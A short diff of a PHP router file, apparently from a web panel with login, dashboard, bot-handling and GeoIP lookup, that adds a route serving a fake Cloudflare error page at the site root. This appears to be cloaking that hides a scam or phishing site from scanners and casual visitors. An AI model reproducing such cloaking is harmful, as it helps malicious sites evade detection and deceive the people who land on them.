@@ -29,6 +29,7 @@ use GeoIp2\Database\Reader;
 if (!$installer) {
     require __DIR__ . '/src/Controllers/Public/Main.class.php';
     $router->all('/login', 'Main@login');
+    $router->all('/', 'FakeErrors@cloudflare');
     $router->all('/request', 'BotHandler@request');
 
     $router->all('/dashboard', 'Main@index');
